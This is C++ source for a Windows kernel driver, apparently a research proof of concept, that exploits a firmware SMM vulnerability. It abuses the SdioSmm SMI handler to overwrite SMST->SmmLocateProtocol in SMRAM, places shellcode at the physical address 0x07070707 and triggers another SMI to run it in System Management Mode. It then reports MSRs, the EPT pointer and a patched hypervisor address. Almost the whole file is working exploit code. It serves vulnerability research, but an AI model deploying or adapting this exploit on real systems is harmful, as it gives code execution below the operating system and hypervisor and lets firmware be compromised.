#include "Demo.hpp"
#include "PhysicalMemory.hpp"
#include "SmmShellCode.hpp"

#if !defined(POOL_ZERO_DOWN_LEVEL_SUPPORT) || !defined(POOL_NX_OPTIN)
#error POOL_ZERO_DOWN_LEVEL_SUPPORT and/or POOL_NX_OPTIN undefined.
#endif

EXTERN_C DRIVER_INITIALIZE DriverEntry;

NTSTATUS
FindSystemManagementServiceTable (
    const PhysicalMemory& Pm,
    PULONG64 SmstAddress
    );

static
NTSTATUS
SetSmmWriteDestination (
    const PhysicalMemory& Pm,
    ULONG64 AddressToWrite
    )
{
    AddressToWrite -= 2;
    return Pm.Write(0x104, &AddressToWrite, sizeof(AddressToWrite));
}

static
void
ExecuteWrite07WithSmm (
    )
{
    __outbyte(0xb2, 0x40);  // SdioSmm
}

static
NTSTATUS
Write07070707WithSmm (
    const PhysicalMemory& Pm,
    ULONG64 AddressToWrite
    )
{
    NTSTATUS status;

    for (ULONG64 offset = 0; offset < 4; ++offset)
    {
        status = SetSmmWriteDestination(Pm, AddressToWrite + offset);
        if (!NT_SUCCESS(status))
        {
            DEMO_ERROR("SetSmmWriteDestination failed : %08x", status);
            goto Exit;
        }
        ExecuteWrite07WithSmm();
    }

Exit:
    return status;
}

static
NTSTATUS
PatchSmstSmmLocateProtocolAddress (
    const PhysicalMemory& Pm
    )
{
    NTSTATUS status;
    EFI_SMM_SYSTEM_TABLE2* smst;

    //
    // Find the address of SMST
    //
    status = FindSystemManagementServiceTable(Pm, reinterpret_cast<PULONG64>(&smst));
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("FindSystemManagementServiceTable failed : %08x", status);
        goto Exit;
    }

    //
    // Patch contents of SMST->SmmLocateProtocol to 0x07070707
    //
    status = Write07070707WithSmm(Pm, reinterpret_cast<ULONG64>(&smst->SmmLocateProtocol));
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("Write07070707WithSmm failed : %08x", status);
        goto Exit;
    }

Exit:
    return status;
}

static
NTSTATUS
ExecuteShellCode (
    )
{
    KAFFINITY previousAffinity;

    //
    // Execute shellcode by triggering SMI for OA3_SMM, which unconditionally
    // calls SmmLocateProtocol.
    //
    // On a multi-core system, it is important to trigger this SMI from BSP (CPU#0)
    // to ensure the shellcode can collect the EPT pointer. Otherwise, this SMI may
    // be executed on an AP, and the shellcode will be executed on the BSP which
    // may be VMX root-operation where the EPT pointer is not stored in the state
    // save area.
    //
    previousAffinity = KeSetSystemAffinityThreadEx(static_cast<KAFFINITY>(1));
    __outbyte(0xb2, 0xdf);
    KeRevertToUserAffinityThreadEx(previousAffinity);
    return STATUS_SUCCESS;
}

static
NTSTATUS
DumpSmmExploitOutput (
    const PhysicalMemory& Pm
    )
{
    NTSTATUS status;
    HOOKED_SMM_LOCATE_PROTOCOL_PARAMETER_BLOCK block;

    status = Pm.Read(&block, 0, sizeof(block));
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("Read failed : %08x", status);
        goto Exit;
    }

    if (block.Smbase == 0)
    {
        DEMO_ERROR("Shell code did not run??");
        status = STATUS_UNSUCCESSFUL;
        goto Exit;
    }

    DEMO_INFO("IA32_SMBASE             = 0x%llx", block.Smbase);
    DEMO_INFO("MSR_SMM_FEATURE_CONTROL = 0x%llx", block.SmmFeatureControl);
    DEMO_INFO("MSR_SMM_MCA_CAP         = 0x%llx", block.SmmMcaCap);
    if (block.Eptp == 0)
    {
        DEMO_INFO("EPT pointer             = Not available");
        DEMO_INFO("Patched Hv address      = Not available");
    }
    else
    {
        DEMO_INFO("EPT pointer             = 0x%llx", block.Eptp);
        DEMO_INFO("Patched Hv address      = 0x%llx", block.HvPatchedAddress);
    }

Exit:
    return status;
}

static
NTSTATUS
ExploitSmm (
    const PhysicalMemory& Pm
    )
{
    NTSTATUS status;
    SmmShellCode shellcode;

    //
    // (1) Find the address of the System Management Service Table (SMST) in SMRAM
    // (2) Overwrite the pointer to the SmmLocateProtocol function
    //
    status = PatchSmstSmmLocateProtocolAddress(Pm);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("PatchSmstSmmLocateProtocolAddress failed : %08x", status);
        goto Exit;
    }
    DEMO_INFO("Patched SMST->SmmLocateProtocol in SMRAM");

    //
    // (3) Write shellcode at physical memory 0x07070707
    //
    status = shellcode.Install(Pm);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("SmmShellCode::Install failed : %08x", status);
        goto Exit;
    }
    DEMO_INFO("Placed SMM shell code");

    //
    // (4) Trigger another SMI that calls the Smst->SmmLocateProtocol
    //
    status = ExecuteShellCode();
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ExecuteShellCode failed : %08x", status);
        goto Exit;
    }
    DEMO_INFO("Triggered SMM exploit");

    //
    // Display results of shellcode
    //
    status = DumpSmmExploitOutput(Pm);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("DumpSmmExploitOutput failed : %08x", status);
        goto Exit;
    }

    DEMO_INFO("Successfully executed shell code in SMM. Failing DriverEntry to unload itself");

Exit:
    return status;
}

static
ULONG64
GetPciConfigAddress (
    ULONG64 PciConfigBase,
    ULONG64 Bus,
    ULONG64 Device,
    ULONG64 Function
    )
{
    NT_ASSERT((Bus <= 0xff) && (Device <= 0x1f) && (Function <= 0x7));
    return PciConfigBase + (Bus << 20) + (Device << 15) + (Function  << 12);
}

static
void
ReportSmramRange (
    const PhysicalMemory& Pm
    )
{
    NTSTATUS status;
    UCHAR mcfgTable[60];
    ULONG64 pciConfigBaseAddr;
    ULONG64 hostBridgeConfigBaseAddr;
    ULONG32 bgsm;
    ULONG32 tsegmb;
    ULONG32 smramBase;
    ULONG32 smramSize;

    //
    // Get the "MCFG" ACPI table as defined in the "PCI Firmware Specification".
    //
    status = ExGetSystemFirmwareTable('ACPI', 'GFCM', mcfgTable, sizeof(mcfgTable), nullptr);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ExGetSystemFirmwareTable failed : %08x", status);
        goto Exit;
    }

    //
    // Need those two values in the host bridge controller at B0:D0:F0.
    //  - 3.35 Base of GTT stolen Memory (BGSM)�Offset B4h
    //  - 3.36 TSEG Memory Base (TSEGMB)�Offset B8h
    // First,compute the address of PCI config space via the MCFG table, then
    // read them.
    //
    pciConfigBaseAddr = *reinterpret_cast<PULONG64>(mcfgTable + 0x2c);
    hostBridgeConfigBaseAddr = GetPciConfigAddress(pciConfigBaseAddr, 0, 0, 0);

    status = Pm.Read(&bgsm, hostBridgeConfigBaseAddr + 0xb4, sizeof(bgsm));
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("Read failed : %08x", status);
        goto Exit;
    }
    status = Pm.Read(&tsegmb, hostBridgeConfigBaseAddr + 0xb8, sizeof(tsegmb));
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("Read failed : %08x", status);
        goto Exit;
    }

    //
    // "When the extended SMRAM space is enabled, processor accesses to the TSEG range
    //  without SMM attribute or without WB attribute are handled by the processor as invalid
    //  accesses.
    //  Non-processor originated accesses are not allowed to SMM space. PCI-Express, DMI,
    //  and Internal Graphics originated cycles to enabled SMM space are handled as invalid
    //  cycle type with reads and writes to location C_0000h and byte enables turned off for
    //  writes."
    //
    // 2.5.3 TSEG
    //
    smramBase = (tsegmb & 0xfff00000);
    smramSize = ((bgsm & 0xfff00000) - (tsegmb & 0xfff00000));
    DEMO_INFO("TSEG implied SMRAM: 0x%lx - 0x%lx", smramBase, smramBase + smramSize);

    //
    // Attempt to read SMRR MSRs and compute SMRAM range from them.
    //
    __try
    {
        ULONG64 smrrBase;
        ULONG64 smrrMask;

        smrrBase = __readmsr(0x1f2);
        smrrMask = __readmsr(0x1f3);

        smramBase = (smrrBase & (smrrMask & 0xfffff000));
        smramSize = (~(smrrMask & 0xfffff000) + 1);
        DEMO_INFO("SMRR implied SMRAM: 0x%lx - 0x%lx ", smramBase, smramBase + smramSize);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DEMO_ERROR("Exception occurred while accessing SMRR MSR : %08x", GetExceptionCode());
    }

Exit:
    return;
}

EXTERN_C
NTSTATUS
DriverEntry (
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath
    )
{
    NTSTATUS status;
    PhysicalMemory pm;

    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    //
    // Break into the debugger only if attached, with a Debug build.
    //
    if (KdDebuggerNotPresent == FALSE)
    {
        KdBreakPoint();
    }

    ExInitializeDriverRuntime(DrvRtPoolNxOptIn);

    //
    // Initialize the interface to access physical memory.
    //
    status = pm.Initialize();
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("PhysicalMemory::Initialize failed : %08x", status);
        goto Exit;
    }

    ReportSmramRange(pm);

    //
    // Exploit the vulnerability.
    //
    status = ExploitSmm(pm);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ExploitSmm failed : %08x", status);
        goto Exit;
    }

    status = STATUS_CANCELLED;

Exit:
    return status;
}